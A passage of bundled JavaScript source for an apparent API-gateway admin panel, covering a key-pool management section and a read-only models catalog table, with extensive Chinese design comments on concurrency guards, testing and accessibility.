t(\"keys.import.result\", presentation.resultParams);\n            if (presentation.showInvalidSuffix) {\n              text += t(\"keys.import.invalidLines\", { lines: c.invalidLines.join(\", \") });\n            }\n            toast(text, presentation.kind);\n            close();\n            load();\n          })\n          .catch((e) => toast(errorMessage(e), \"err\"));\n      },\n    },\n  ]);\n}\n\n/**\n * 「添加 Key」分组下拉。**设计文档 §10.2 定死的结构，控制端裁定现在就建**：\n * 【自动注册】（MoeMail / YYDS 两条通道，§10.3 要求\"完全平级\"）与【手动】\n * （粘贴单个 / 批量导入）。**本任务只填【手动】那两项的内容**——它们复用同一个\n * `openImport()`（后端只有一个 `POST /admin/api/keys`，接受 1..200 把，\"单个\"\n * 与\"批量\"在这条端点上没有分叉，硬造两个入口只会多一份要维护的弹窗）；\n * 【自动注册】那两项**先占位、禁用、挂一句说明性 tooltip**，留给 Task 6 接线\n * 到注册机端点。**容器与两组平级的结构现在定死，Task 6 只需要把这两颗按钮的\n * `disabled` 摘掉、接上真实的 onClick**，不必回头重构这个工具栏——那正是\n * 「现在不建容器，Task 5/6 就要拿掉一颗按钮重新长出一个菜单」这条风险的解法。\n *\n * ⚠️ **\"批量导入（多行 / JSON 数组）\"这句设计原文没有照抄**：本仓的导入框\n * 只按行拆（`importLines()`），不解析 JSON 数组——照抄那句话等于承诺一个\n * 没有实现的能力，一个把 `[\"sk-a\",\"sk-b\"]` 粘进去的运维会得到一条\"不合法的\n * key\"而不是两把导入成功的 key。菜单文案改成如实描述现在的行为\n * （`keys.addMenu.bulkImport`：「批量导入（每行一把）」）。\n *\n * ── P3c Task 6：【自动注册】那两项接上了 ────────────────────────────────────\n *\n * 两项各自触发一次**只用这条通道**的手动补池（`POST /admin/api/registrar/tend`\n * 的 `channel` 参数）。**共用注册机板块那一个确认弹窗**（`confirmAndTend()`），\n * 不在这里抄第二份——设计 §10.2 第 3 条护栏（确认弹窗必须明示消耗）抄两份的话，\n * 迟早只剩一份，而少的那一份正好是点击频率更高的这个入口。\n *\n * ⚠️ **两项一律可点，不按「这条通道配没配」去禁用其中一条。** 判「配没配」要先\n * 拉一次 `/registrar/status`，而那意味着每次打开 Key 池板块都多一次请求；更要紧的是\n * **一条灰掉、一条能点**在视觉上就是一次排名**，而它依赖的是一份可能已经过期的\n * 配置快照。没配好的那条由后端当场回 `409 channel_not_configured`，面板把那句话\n * 原样显示出来——**结构上完全平级，差别只出现在真的点下去之后，且那时说的是事实。**\n */\nfunction buildAddKeyMenu() {\n  const wrap = el(\"div\", { class: \"dropdown\" });\n  const trigger = elI18n(\"button\", \"keys.addMenu.open\", {\n    type: \"button\", \"aria-haspopup\": \"true\", \"aria-expanded\": \"false\",\n  });\n  const menu = el(\"div\", { class: \"dropdown-menu\" });\n  menu.style.display = \"none\";\n\n  const closeMenu = () => { menu.style.display = \"none\"; trigger.setAttribute(\"aria-expanded\", \"false\"); };\n  const openMenu = () => { menu.style.display = \"\"; trigger.setAttribute(\"aria-expanded\", \"true\"); };\n  trigger.addEventListener(\"click\", () => {\n    if (menu.style.display === \"none\") openMenu(); else closeMenu();\n  });\n  // Escape 关菜单，不吞给页面上别的 Escape 监听器（比如同时开着的弹窗——\n  // 两者不会同时存在，菜单打开时不会有弹窗，弹窗打开时菜单早就该被这次点击关掉了）。\n  wrap.addEventListener(\"keydown\", (ev) => { if (ev.key === \"Escape\") closeMenu(); });\n  // ⚠️ **「点菜单外面收起它」这条本任务没有做，理由如实登记在这里。**\n  // 它要求点击事件从被点的元素冒泡到 document，而 `tests/helpers/fake-dom.ts` 的\n  // `dispatchEvent` **刻意不冒泡**（那份夹具的注释逐字写着「板块代码没有依赖冒泡\n  // 的地方，实现它只会多一处猜测」）⇒ 任何写法在那套 DOM 用例里都**跑不到**，\n  // 交付的就会是一段没有任何自动化覆盖的发货代码，而它的失效形态正是\n  // `ui.js` 的 `focusableIn()` 那次真机事故的同一族（在夹具里看着对、真机上不对）。\n  // 要做的话先让夹具支持冒泡，那与 Task 4 记下的「替身方案 B」是同一个量级的改动。\n  // 今天关菜单有两条路：Escape，或者再点一次触发按钮。\n\n  const autoGroup = el(\"div\", { class: \"dropdown-group\" });\n  autoGroup.appendChild(elI18n(\"div\", \"keys.addMenu.autoGroup\", { class: \"dropdown-group-label\" }));\n  // **两项完全平级**：同一个循环、同一套属性、同一条发起路径，唯一的差别是那个\n  // 通道名字符串。顺序取自 `pure/registrar.mjs` 的 `CHANNELS`（字母序），\n  // 与注册机板块两张通道卡的顺序是同一个真源——两处各写一份的话，同一个面板上\n  // 会出现两种通道顺序，而任何顺序都会被读成排名。\n  for (const channel of CHANNELS) {\n    const key = channel === \"yyds\" ? \"keys.addMenu.autoYyds\" : \"keys.addMenu.autoMoemail\";\n    const btn = elI18n(\"button\", key, { type: \"button\" });\n    btn.setAttribute(\"data-channel\", channel);\n    btn.addEventListener(\"click\", () => { closeMenu(); confirmAndTend(channel); });\n    autoGroup.appendChild(btn);\n  }\n  menu.appendChild(autoGroup);\n\n  const manualGroup = el(\"div\", { class: \"dropdown-group\" });\n  manualGroup.appendChild(elI18n(\"div\", \"keys.addMenu.manualGroup\", { class: \"dropdown-group-label\" }));\n  for (const key of [\"keys.addMenu.pasteSingle\", \"keys.addMenu.bulkImport\"]) {\n    const btn = elI18n(\"button\", key, { type: \"button\" });\n    btn.addEventListener(\"click\", () => { closeMenu(); openImport(); });\n    manualGroup.appendChild(btn);\n  }\n  menu.appendChild(manualGroup);\n\n  wrap.appendChild(trigger);\n  wrap.appendChild(menu);\n  return wrap;\n}\n\nfunction buildToolbar() {\n  const bar = el(\"div\", { class: \"toolbar\" });\n\n  const search = el(\"input\", { type: \"search\", \"data-i18n-ph\": \"keys.search\" });\n  search.setAttribute(\"placeholder\", t(\"keys.search\"));\n  search.addEventListener(\"input\", () => {\n    state.q = search.value;\n    state.page = 1;\n    if (searchTimer !== null) clearTimeout(searchTimer);\n    searchTimer = setTimeout(() => { searchTimer = null; load(); }, SEARCH_DEBOUNCE_MS);\n  });\n  bar.appendChild(search);\n\n  const select = el(\"select\", { \"data-i18n-title\": \"keys.filter\" });\n  // 初始 title / aria-label 必须在这里写死一次：`apply(document)` 在 boot 时就跑完了，\n  // 而这棵子树是之后才建的，只挂 data-i18n-title 的话要等一次切语言才有无障碍标签。\n  select.setAttribute(\"title\", t(\"keys.filter\"));\n  select.setAttribute(\"aria-label\", t(\"keys.filter\"));\n  const options = {};\n  for (const b of CARDS) {\n    const o = el(\"option\", { value: b });\n    select.appendChild(o);\n    options[b] = o;\n  }\n  select.value = state.bucket;\n  select.addEventListener(\"change\", () => { state.bucket = select.value; state.page = 1; load(); });\n  bar.appendChild(select);\n\n  const refresh = elI18n(\"button\", \"common.refresh\", { type: \"button\" });\n  refresh.addEventListener(\"click\", () => { load(); });\n  bar.appendChild(refresh);\n\n  bar.appendChild(buildAddKeyMenu());\n\n  const autoWrap = el(\"label\", { class: \"auto\" });\n  autoWrap.appendChild(elI18n(\"span\", \"keys.auto\"));\n  const auto = el(\"select\");\n  const autoOptions = {};\n  for (const sec of AUTO_SECONDS) {\n    const o = el(\"option\", { value: String(sec) });\n    auto.appendChild(o);\n    autoOptions[sec] = o;\n  }\n  auto.value = String(state.autoSec);\n  auto.addEventListener(\"change\", () => { state.autoSec = Number(auto.value); restartTimer(); });\n  autoWrap.appendChild(auto);\n  bar.appendChild(autoWrap);\n\n  return { bar, options, autoOptions };\n}\n\nexport const keysSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"keys.title\"));\n\n    const tb = buildToolbar();\n    section.appendChild(tb.bar);\n    // 自动刷新的开销**如实写**：这个板块与转发共用同一份 isolate 快照，确实不额外\n    // 烧存储配额。这里不抄一个吓人的估算数字——那同样是撒谎。\n    // 文案含 `{ttl}` 占位符，不用 elI18n（那是给静态、无插值文案用的）——\n    // 由 render() 每次用当前的 `knobs.ttl` 重写 textContent。\n    const autoNote = el(\"p\", { class: \"muted note\" });\n    section.appendChild(autoNote);\n\n    const cardRow = el(\"div\", { class: \"card-row\" });\n    const cardValues = {};\n    const cardLabels = {};\n    for (const b of CARDS) {\n      const card = el(\"div\", { class: \"card\" });\n      cardLabels[b] = el(\"div\", { class: \"label\" });\n      cardValues[b] = el(\"div\", { class: \"value\" });\n      card.appendChild(cardLabels[b]);\n      card.appendChild(cardValues[b]);\n      cardRow.appendChild(card);\n    }\n    section.appendChild(cardRow);\n\n    // 批量条：设计文档 §10.2 排在「4 张汇总卡」与「分页列表」之间，「选中才出现」。\n    const bulk = buildBulkBar();\n    section.appendChild(bulk.bar);\n\n    const body = el(\"div\", { class: \"keys-body\" });\n    section.appendChild(body);\n\n    const pager = el(\"div\", { class: \"pager\" });\n    const prev = elI18n(\"button\", \"keys.prev\", { type: \"button\" });\n    const next = elI18n(\"button\", \"keys.next\", { type: \"button\" });\n    const pageInfo = el(\"span\", { class: \"muted\" });\n    prev.addEventListener(\"click\", () => { if (state.page > 1) { state.page--; load(); } });\n    next.addEventListener(\"click\", () => { state.page++; load(); });\n    pager.appendChild(prev);\n    pager.appendChild(pageInfo);\n    pager.appendChild(next);\n    section.appendChild(pager);\n\n    // 新鲜度提示：与概览页共用同一份文案（设计文档 §10.1 / §10.2 的「新鲜度提示条」）。\n    // 同样含插值占位符，理由同上面的 autoNote。\n    const freshnessNote = el(\"p\", { class: \"muted note\" });\n    section.appendChild(freshnessNote);\n\n    nodes = {\n      body, pageInfo, prev, next,\n      options: tb.options, autoOptions: tb.autoOptions,\n      cardValues, cardLabels, autoNote, freshnessNote,\n      bulkBar: bulk.bar, bulkCount: bulk.count,\n    };\n  },\n\n  onShow() {\n    load();\n    loadKnobs();\n    restartTimer();\n  },\n\n  onHide() {\n    stopTimers();\n    // **作废在飞请求**：不作废的话切回来时旧响应可能盖掉新数据（板块契约 §9.3）。\n    if (abort) { abort.abort(); abort = null; }\n    // 验活那一族有自己的取消闸，见 `abortVerifies()`。\n    abortVerifies();\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"34d798d0c0a33a22\"" },
  "/admin/js/sec-models.js": { body: "/**\n * 模型板块（设计文档 §10.7 / §11）：一张只读表 ——\n * 模型 ID / 类型（字段名 `modality`）/ 协议可用性矩阵（四个徽章）/ 端点。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * ── **本板块是「消费协议目录」这条路径的第一个前端消费者** ────────────────────\n * P3d 核心设计决定（全局约束 15）：四个消费者只许有一份「怎么调这个网关」的知识。\n * ⇒ **本文件的可执行代码里没有任何一条对外端点路径、没有任何一个协议 id、\n *    也没有任何一份请求体形状**（唯一的 admin 路径是 `api.get(\"/models\")`，\n *    它为什么不算第二份知识，见本文件头「`api.get(\"/models\")` 这条 admin 路径\n *    为什么不算第二份端点知识」那一段）。\n * 协议 id 与展示名来自响应的 `protocols[]`，端点原样搬运响应的 `endpoints[]`，\n * 连「视频模型是两段式」这件事都是数出来的、不是写死的。\n *\n * ⚠️ **端点那一列一个字符都不在前端拼。** 视频模型那一行会有两条（一次创建 +\n * 一次查询），**两条都要画**——只画一条就是把两段式教成一段式，而运维照着面板\n * 写出来的客户端会永远拿不到结果。由 `tests/ui/dom/models-section.test.ts` 的\n * 「视频模型那一行同时列出两条端点 —— 只显示一条就是把两段式教成一段式」那一格钉着。\n *\n * ⚠️ **别把「本文件没写端点」读成「前端从此不可能硬编码端点」**：\n * `tests/ui/no-hardcoded-endpoints.test.ts` 的\n * 「已知抓不住的写法确实抓不住（边界是断言，不是散文）」那一组自己登记着一条盲点\n *（**字符串拼接**：一条路径被拆成两截、分写在两对引号里，扫字面量的判据按定义\n * 看不见它）。那道扫描挡住的是**顺手写下一条路径**，不是**刻意绕开**。\n *\n * ── 三条纪律（与其余六个板块相同）──────────────────────────────────────────\n * ① 一切来自接口的内容一律 textContent（`el()` 走的就是它）：模型 id 与端点路径\n *    虽然今天来自本仓写死的目录，但它们是**经过一次网络往返**才到这里的；\n * ② **取值决策一律不写在这里**，全在 `js/pure/models.mjs` 里（admin-ui/README.md 硬规则 1）；\n * ③ **一切形态分支只读接口返回的字段**，不许自己嗅探运行时（全局约束 1）。\n *\n * ── 为什么没有刷新按钮，而错误横幅上却有一颗 ────────────────────────────────\n * 工具栏上**没有刷新按钮**（设计 §10.7：agnes 的模型是硬编码的，\n * 没有「跨账号刷新」这个动作）——那颗按钮会承诺一个不存在的语义。\n * 错误横幅上那颗**不是刷新，是「再读一次」**：它治的是一次读取失败，不是「数据变了」。\n * 少了它，一次网络抖动会让这个板块在本次会话里一直停在错误页上\n *（`onShow()` 虽然会重试，但那要求用户先猜到「切走再切回来」这个动作）。\n *\n * ── 在飞的读只许有一条，**这是被守着的**（订正） ──────────────────────────────\n * ⚠️⚠️ **这一段原来写的是「本板块没有在飞请求的作废条件……它只有一条异步链……\n * 回来晚了的那一份写进去也不会是过期数据」，那三句里有两句是假的**\n *（P3d Task 6 评审 Important 1，已实测）：\n * · **「只有一条异步链」是假的**：`load()` 有**两个**入口——`onShow()`（`catalog === null`\n *   时）与错误横幅上那颗「再读一次」（那颗按钮不禁用、当时也没有重入护栏）。\n *   第一条读**还在飞着**时切走再切回来，`catalog` 仍是 `null` ⇒ 第二条链就发出去了。\n * · **「回来晚了的那份不会是过期数据」只对成功响应成立**：`catch` 分支把 `catalog`\n *   清成 `null`，于是一条晚到的**失败**会把**已经画好的正确的表**抹成「读不出来」。\n *   这一步在原推理里整个缺失。实测探针（修复前）：\n *   `calls=2 rowsAfterSuccess=4 rowsAfterLateFailure=0`。\n * ⇒ 治的是**根因**：`load()` 开头那条 `inFlight` 早退，**隐式入口不再发第二条链**。\n * 由 `tests/ui/dom/models-section.test.ts` 的\n * 「在飞的读还没回来就切走再切回来：不许发出第二条读 —— 两条链并存正是那条晚到失败的来源」\n * 与「晚到的失败不许把已经画好的表抹掉 —— 表已经画好了，那次失败什么新东西都没说」两格钉着。\n *\n * ⚠️⚠️ **这条不变量是有代价的，写清楚（复评 F1，这是本文件自己立的规矩）**：\n * `admin-ui/js/api.js` 这条链**没有超时**（`raw()` 的 `signal` 只透传调用方给的），\n * 所以一条读可以永远飞着。上一版的 `inFlight` 是**裸早退、不调 `render()`**\n * ⇒ 挂住之后每一次 `onShow()` 都什么都不画，终局是**只剩标题和副标题的空板块**\n *（实测 `calls=1 rows=0 banner=0 retry=0 unknown=0`），\n * 而上面那句「切走再切回来」的恢复动作**当场失效**。\n * ⚠️ **控制端原本裁定的 `sec-usage.js` 那套没有这个毛病**：它每次 `load()` 都\n * `if (abort) abort.abort()` 再发，**重发即自救**。我用一条更强的不变量换掉了一条恢复性质，\n * 上一版**只写了收益、一个字没写代价**——那正是本文件两处「⚠️ 但要写清代价」要防的事。\n * ⇒ **现在两条都保住**：隐式入口（`onShow()`）在飞时**只 `render()` 不发请求**\n *（挂住时至少看得见「读不出来」+「再读一次」），\n * 而那颗「再读一次」**有权抢占**（`load(true)`：abort 掉旧的再发）。\n * 剩下的代价如实登记：**首次读挂住、且用户一次都没切回来过时，板块仍是空白的**\n *（那一刻还没有任何 `render()` 发生过）——今天不加「加载中」那一档，\n * 因为它要一个新的 UI 状态 + 新的 i18n key，而挂住本身是个真机才见得到的低频事件。\n *\n * ⚠️ **为什么不是 `admin-ui/js/sec-usage.js` 那整套**\n *（**与评审裁定有出入，明写，理由是实测出来的**）：\n * ⚠️ 先把那一套说全（复评 F7：上一版把它概括成「最新的一条赢的世代号」，**漏了一半**）——\n * 它是**两件东西**：`AbortController`（每次 `load()` 先 `abort()` 上一条）**加**\n * `seq` / `detailSeq` 两个世代号。这里没照搬的是**「每次都无条件重发」**那一半；\n * abort + 世代号本身，本文件在抢占那条路上用的就是它。\n * 具体到「最新的一条赢」这条规则：\n * 那套规则的前提是「新数据取代旧数据」，而这份目录**是静态的**。\n * 在上面那个序列里，**成功的恰恰是先发的那一条**（世代号更小）⇒ 世代号会把它整份丢掉、\n * 转而认后发的那条**失败**为最新结果 ⇒ 终局仍然是一张「读不出来」的页面。\n * 实测：装上世代号之后，上面第二格从「表被抹掉」变成\n * 「**前置条件：成功的那一条得先把表画出来** expected +0 to be 4」——**它照样不绿**，\n * 而第一格（`calls` 仍是 2）连动都没动。\n * ⇒ **被否掉的是「每次 `load()` 都无条件重发、最新的一条赢」这条规则**，不是世代号本身。\n *\n * ⚠️ **上一版这里接着写「装上 `inFlight` 之后世代号还会是一段永不触发的代码」，\n * 那句在本轮已经变成假话，本轮一并改真**：复评 F1 之后那颗「再读一次」**有权抢占**\n *（`load(true)`），**抢占就会造出一条被作废的链** ⇒ 世代号现在有真实的触发路径，\n * 由「读挂住时点「再读一次」：旧的那条被抢占，它晚到的失败不许盖掉新的成功」那一格钉着。\n * ⭐ 记一条形状：**一句「今天用不上它」的话，会被同一个文件后来的改动推翻**——\n * 这已经是本任务第二次（上一次是「只有一条异步链」）。写这类话时先问一句\n * **「什么改动会让它变假」**，并且把那句话放在离它所描述的代码最近的地方。\n *\n * ── 触屏上「可用 / 不可用」只剩颜色一条线索（**已知不达标，登记 P3e**）────────\n * ⚠️⚠️ 徽章的状态今天由三样东西表达：颜色（`.badge-ok` vs 中性灰）、\n * `title` 那句整话、以及 `data-available`。**但触屏没有 hover** ⇒ `title` 出不来；\n * 而 `data-available` 是 data 属性，**用户根本看不见**（上一版报告把它写成\n * 「触屏用户仅有的两条线索」之一，那句是错的）。\n * ⇒ **触屏上只剩颜色一条**，这是 WCAG 1.4.1（Use of Color）的正面不达标。\n * 那根 EM DASH 也同理靠 `title` + `cursor: help`，不过它那一半被**同屏的红条\n * 与「再读一次」按钮**缓解了，徽章这一半没有。\n * **本任务不在这里单独改**：`.badge` / `.badge-ok` / `.badge-warn` / `.badge-danger`\n * 是全仓四个板块共用的一套 tooltip-only 继承问题，只在模型板块改反而制造不一致。\n * **登记给 P3e 统一处理**（做法之一：给徽章加一个不依赖 hover 的可见记号）。\n * ⚠️ 这条写在这里而不是只写在报告里，理由是本任务自己立过的那条：\n * **报告在 `.superpowers/` 不进仓，只写在报告里等于没写。**\n *\n * ── `api.get(\"/models\")` 这条 admin 路径为什么不算「第二份端点知识」 ──────────\n * 全局约束 15 管的是「怎么调**这个网关**」那张对外面（`/v1`、请求体形状、鉴权头），\n * 不是「怎么够得着那份真源」。`sec-usage.js` 已经写着同样的 `api.get(\"/models\")` 与\n * `api.get(\"/capabilities\")`，本文件与它同一条边界。\n * ⚠️ **但要写清代价：这条 admin 路径今天没有任何机器在守**\n *（`tests/ui/no-hardcoded-endpoints.test.ts` 的正则只认 `/v1` 开头的对外路径）。\n * 本文件头开头那句「可执行代码里没有任何一条对外端点路径」说的是**那张对外面**，不是这一条。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n } from \"./ui.js\";\nimport { fmtDash } from \"./pure/format.mjs\";\nimport {\n  protocolBadges, filterByProtocol, catalogProtocols, catalogModels, modalityLabelKey,\n} from \"./pure/models.mjs\";\n\nlet nodes = null;\n/**\n * 窄化之后的目录。`null` = **还没读到 / 读不出来**，两者在渲染上是同一档\n *（都还不知道这个网关认得哪些模型），区别只在「有没有人已经发过那次请求」。\n */\nlet catalog = null;\n/** 当前选中的协议 id；`\"\"` = 「全部」那一档。**取值来自响应，不是本地枚举。** */\nlet filter = \"\";\n/**\n * 这一刻有没有一条读在飞。\n *\n * ⚠️ **它是本板块并发护栏的「两条之一」，不是唯一的那一条**\n *（P3d Task 6 定向复评 F2，实测订正）：另一条是 `onShow()` 里的\n * `if (catalog !== null) { render(); return; }`。\n * 实测反例：**留着本变量不动**、只删掉 `onShow()` 那一行 ⇒ 表照样被抹\n *（`rows 4→0, unknown 0→1, calls 1→2`）。上一版这里与 `load()` 的 catch 上方\n * 都写着「唯一」，**那句话把下一个人指向了两条守卫里的一条**。\n *\n * ⚠️ 它同时兜住了另一件事：错误横幅上那颗「再读一次」**不禁用**，\n * 连点两下会发出两条链——现在第二下走的是抢占那条路（见 `load()` 的 `preempt`）。\n */\nlet inFlight = false;\n/**\n * 在飞请求的世代号。**上一轮刻意没有它，这一轮它有了真实的触发路径**：\n * 「再读一次」可以**抢占**一条挂住的读（复评 F1），于是被抢占的那条必须作废。\n * 没有它的话，被抢占的那条晚到的结果会盖掉新发那条的结果——\n * 这正是评审 Important 1 那个缺陷换了个入口重演一遍。\n */\nlet seq = 0;\n/**\n * 在飞那条读的取消器。**它省的是一次真实的网络往返，不是作废判据**——\n * 作废判据是上面那个世代号。\n *\n * ⚠️⚠️ **abort 这一半在测试里天然不可观测，写清楚**（复评 F1）：\n * 全仓只有 `admin-ui/js/api.js` 一处把 `signal` 交给 `fetch`，而\n * `tests/ui/dom/harness.ts` 的 `fetch` 替身**零处**看它 ⇒ 被 abort 的那条链\n * 在测试里照样会落地。**别把「那两格绿了」读成「abort 被钉住了」**——\n * 它们钉的是世代号。真实浏览器里 abort 让那条链以 `AbortError` 拒绝，\n * 世代号在 catch 里同样把它挡在外面，两种环境走的是同一条判据。\n */\nlet abort = null;\n\n/** 一个内容块：标题 + 空的 body 容器。 */\nfunction block(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  wrap.appendChild(elI18n(\"h3\", titleKey));\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body };\n}\n\n/** 一行「表头」。 */\nfunction headRow(keys) {\n  const tr = el(\"tr\");\n  for (const k of keys) tr.appendChild(elI18n(\"th\", k));\n  return tr;\n}\n\n/**\n * 「按协议筛选」的分段选择器。**复用事件 / 用量板块那套 `.btn-group` / `.btn-toggle`**，\n * 不新起一套 class：三个板块的这个控件在交互与外观上是同一件东西，各写一份迟早长得不一样。\n *\n * ⚠️ **档位由响应里的 `protocols[]` 生成，本文件不认识任何一个协议 id。**\n * 「全部」那一档的值是空串 —— 它不是一个协议，所以它没有 id、也不从响应里来。\n */\nfunction buildFilterBar() {\n  const wrap = el(\"div\");\n  const bar = el(\"div\", { class: \"btn-group\" });\n  bar.appendChild(elI18n(\"span\", \"models.filter.label\", { class: \"muted\" }));\n\n  const all = elI18n(\"button\", \"models.filter.all\", { type: \"button\", class: \"btn-toggle\", \"data-protocol\": \"\" });\n  all.classList.toggle(\"active\", filter === \"\");\n  all.addEventListener(\"click\", () => { if (filter !== \"\") { filter = \"\"; render(); } });\n  bar.appendChild(all);\n\n  for (const p of catalog.protocols) {\n    // 展示名走响应里的 `label`（协议的专名，**刻意不进 i18n**，理由见\n    // `src/core/admin/protocol-catalog.ts` 里 `label` 字段上方那一行）。\n    // 三条都不许走：本地再写一张映射、把 id 拼进一个 i18n key、直接渲染裸 id。\n    const btn = el(\"button\", { type: \"button\", class: \"btn-toggle\", \"data-protocol\": p.id }, p.label);\n    btn.classList.toggle(\"active\", filter === p.id);\n    btn.addEventListener(\"click\", () => { if (filter !== p.id) { filter = p.id; render(); } });\n    bar.appendChild(btn);\n  }\n  wrap.appendChild(bar);\n  return wrap;\n}\n\n/**\n * 一行的协议可用性矩阵。**四个格子恒在**，不可用的画成灰徽章。\n * 判定在 `js/pure/models.mjs` 的 `protocolBadges()`，这里只负责把它画出来\n * ——让板块文件自己目测 `model.protocols.includes(...)` 就等于把判定抄回了 DOM 代码。\n */\nfunction badgeCell(model) {\n  const td = el(\"td\");\n  for (const b of protocolBadges(model, catalog.protocols)) {\n    // ⚠️ tooltip 的两个 key **写成三元里的两个字面量**，不是拼出来的\n    //（全局约束 12：动态拼 key 会让三道 i18n 门禁一起哑）。\n    const tip = b.available ? t(\"models.badge.yes\") : t(\"models.badge.no\");\n    // ⚠️ **不可用那一档刻意不加任何修饰类**：`.badge` 的底样式本身就是中性灰，\n    //    而 `admin-ui/css/sections.css` 里 `.badge-danger` 下面那段注释逐字裁过\n    //    「别加一个取值与 `.badge` 逐字相同的同义类」。灰 = 不可用，绿 = 可用。\n    // ⚠️ **状态不只靠颜色**：`title` 里那句话把它写成字，读屏与鼠标悬停都拿得到。\n    const span = el(\"span\", {\n      class: b.available ? \"badge badge-ok\" : \"badge\",\n      \"data-protocol\": b.id,\n      \"data-available\": b.available ? \"yes\" : \"no\",\n      title: `${b.label} — ${tip}`,\n    }, b.label);\n    td.appendChild(span);\n  }\n  return td;\n}\n\n/**\n * 端点那一列。**原样搬运响应里的 `method` 与 `path`，一个字符都不在前端拼。**\n * 一条端点一行——挤在一行里的话视频模型那两条会被读成一条带斜杠的长路径。\n */\nfunction endpointCell(model) {\n  const td = el(\"td\");\n  for (const e of model.endpoints) {\n    td.appendChild(el(\"div\", { class: \"mono models-endpoint\" }, `${e.method} ${e.path}`));\n  }\n  return td;\n}\n\n/** 类型那一格。表外的形态**照实显示原值**，不冒充任何一档已知形态。 */\nfunction modalityCell(model) {\n  const key = modalityLabelKey(model.modality);\n  const td = el(\"td\");\n  td.appendChild(key === null ? el(\"span\", { class: \"mono\" }, model.modality) : elI18n(\"span\", key));\n  return td;\n}\n\nfunction buildTable(rows) {\n  const { wrap, body } = block(\"models.table.title\");\n  if (rows.length === 0) {\n    // ⚠️ **「这条协议上一个模型都没有」与「这个网关一个模型都没有」是两句话**，\n    //    而它们都不是「读不出来」（那一档根本走不到这里，见 `render()` 的早退）。\n    body.appendChild(elI18n(\n      \"p\", filter === \"\" ? \"models.empty\" : \"models.filterEmpty\", { class: \"muted note\" },\n    ));\n    return wrap;\n  }\n  const table = el(\"table\");\n  table.appendChild(headRow([\n    \"models.col.id\", \"models.col.modality\", \"models.col.protocols\", \"models.col.endpoints\",\n  ]));\n  for (const m of rows) {\n    const tr = el(\"tr\", { class: \"models-row\", \"data-model\": m.id });\n    tr.appendChild(el(\"td\", { class: \"mono\" }, m.id));\n    tr.appendChild(modalityCell(m));\n    tr.appendChild(badgeCell(m));\n    tr.appendChild(endpointCell(m));\n    table.appendChild(tr);\n  }\n  body.appendChild(table);\n  return wrap;\n}\n\n/**\n * 读不出来那一档。\n *\n * ⚠️⚠️ **这里绝不能退化成「渲染一张空表」**（全局约束 9 的同型）：一张空表会被读成\n *「这个网关一个模型都没有」，而事实是我们**不知道**它认得哪些模型。\n * 所以这一档画的是：一条红色横幅（说清是读取失败，并给一颗「再读一次」）\n * **加一根 EM DASH**——那根破折号就是「我们不知道」这句话本身。\n * 由 `tests/ui/dom/models-section.test.ts` 的\n * 「GET /admin/api/models 返回 404 时不渲染空表，而是错误提示加一根 EM DASH」那一格钉着。\n */\nfunction buildUnavailable() {\n  const wrap = el(\"div\");\n  const banner = el(\"div\", { class: \"banner-danger\", role: \"status\" });\n  banner.appendChild(elI18n(\"span\", \"common.loadFailed\"));\n  const retry = elI18n(\"button\", \"common.refresh\", { type: \"button\", class: \"models-retry\" });\n  // ⚠️ **`true` = 抢占**（复评 F1）：这是用户明确表达的意图，它应该赢。\n  //    传 `false` / 不传的话，一条挂住的读会让这颗按钮变成一颗按了没反应的死按钮。\n  retry.addEventListener(\"click\", () => { load(true); });\n  banner.appendChild(retry);\n  wrap.appendChild(banner);\n\n  const { wrap: card, body } = block(\"models.table.title\");\n  body.appendChild(el(\"p\", { class: \"models-unknown\", title: t(\"models.unavailable\") }, fmtDash(null)));\n  wrap.appendChild(card);\n  return wrap;\n}\n\n/**\n * 整个板块重画一遍。**每次都把 body 清空重建**：藏起来的表格仍然在无障碍树里、\n * 仍然会被复制粘贴带走，而它们显示的可能是一份读不出来的数据。\n */\nfunction render() {\n  const host = nodes.body;\n  host.textContent = \"\";\n  if (catalog === null) {\n    host.appendChild(buildUnavailable());\n    return;\n  }\n  host.appendChild(buildFilterBar());\n  host.appendChild(buildTable(filterByProtocol(catalog.models, filter)));\n}\n\n/**\n * 拉一次协议目录。**零存储读**（`src/http/admin/handlers/models.ts` 全部来自模块级常量），\n * 所以它不进配额账；但它仍然是一次网络往返，**成功读过一次就不再读**——\n * 目录是静态的，重读一遍只会换来一次「这次可能失败」的机会。\n *\n * ⚠️ **两个不同的失败必须落到同一档**：HTTP 失败（`api.get` 抛）与「响应读得回来\n * 但形状不对」（窄化交出 `null`）在面板上都是「我们不知道」。少了后一半的话，\n * 一份被中间件改过形状的响应会让面板画出一张**结构自洽而内容缺斤少两**的表。\n */\nasync function load(preempt) {\n  // ⚠️⚠️ **隐式入口（`onShow()`）在飞时不再发第二条，但**必须**把当前状态画出来。**\n  //    上一版这里是**裸 `return`**，于是一条永不落地的读会让此后每一次 `onShow()`\n  //    都什么都不画 ⇒ 只剩标题和副标题的空板块（复评 F1 实测：\n  //    `calls=1 rows=0 banner=0 retry=0 unknown=0`），**连自救入口都没有**。\n  //    加上这个 `render()` 之后，挂住时切回来至少看得见「读不出来」+「再读一次」。\n  // ⚠️ **`preempt` 只由那颗「再读一次」传 `true`**：显式的用户动作有权抢占，\n  //    隐式的板块切换没有。由 `tests/ui/dom/models-section.test.ts` 的\n  //    「读挂住之后切回来不是一片空白 —— 至少要看得见「读不出来」和那颗「再读一次」」\n  //    与「读挂住时点「再读一次」：旧的那条被抢占，它晚到的失败不许盖掉新的成功」两格钉着。\n  if (inFlight && !preempt) { render(); return; }\n  // 抢占：把上一条的 socket 放掉。**它不是作废判据**，作废判据是下面的世代号。\n  if (abort) abort.abort();\n  abort = new AbortController();\n  const signal = abort.signal;\n  const mine = ++seq;\n  inFlight = true;\n  try {\n    const body = await api.get(\"/models\", { signal });\n    if (mine !== seq) return;\n    const protocols = catalogProtocols(body);\n    const models = catalogModels(body);\n    catalog = protocols === null || models === null ? null : { protocols, models };\n  } catch (e) {\n    // ⚠️ **这里原来写着「走到这里只可能是『从来没成功过』」，那句是假的**\n    //    （评审 Important 1 